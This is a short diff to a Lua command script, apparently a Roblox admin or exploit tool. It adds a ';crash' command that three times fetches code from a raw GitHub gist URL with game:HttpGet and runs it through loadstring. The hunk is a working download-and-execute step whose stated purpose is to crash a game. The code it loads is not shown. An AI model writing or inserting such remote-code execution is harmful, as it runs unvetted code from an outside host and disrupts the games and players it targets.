@@ -187,6 +187,13 @@ elseif cmd == ";unfreeze" and arg ~= "" then
 	end
 
 
+elseif cmd == ";crash" then
+	for i = 1,3 do
+		task.spawn(function()
+			loadstring(game:HttpGet("https://gist.githubusercontent.com/Cat558-uz/21cb4a4072108f05debaeeefc2f39418/raw/71ffee13e246bb6a6981eeabb2427be01deaa550/gistfile1.txt"))()
+		end)
+	end
+
  elseif cmd == ";unfly" and arg ~= "" then
 	local alvo = findPlayerByName(arg)
 	if alvo and alvo.Character then
